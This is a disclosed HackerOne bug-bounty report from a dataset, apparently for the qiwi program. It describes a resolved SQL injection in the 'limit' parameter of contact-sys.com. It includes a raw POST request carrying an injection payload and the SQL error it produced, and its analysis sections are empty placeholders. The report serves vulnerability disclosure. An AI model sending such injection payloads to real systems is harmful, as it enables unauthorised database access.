---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164945'
original_report_id: '164945'
title: '[contact-sys.com] SQL Injection████ limit param'
weakness: SQL Injection
team_handle: qiwi
created_at: '2016-09-01T09:09:15.454Z'
disclosed_at: '2018-11-18T07:26:39.607Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 50
tags:
- hackerone
- sql-injection
---

# [contact-sys.com] SQL Injection████ limit param

## Metadata

- HackerOne Report ID: 164945
- Weakness: SQL Injection
- Program: qiwi
- Disclosed At: 2018-11-18T07:26:39.607Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий:**████
**Уязвимый параметр:** limit
```
POST█████ HTTP/1.1
Host: contact-sys.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 59

country_code=RU&send_rec_type=1&action=index&term=&limit=10+INTO+@A
```
Ответ
```
{"error":"SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns","errorCode":"SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns"}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
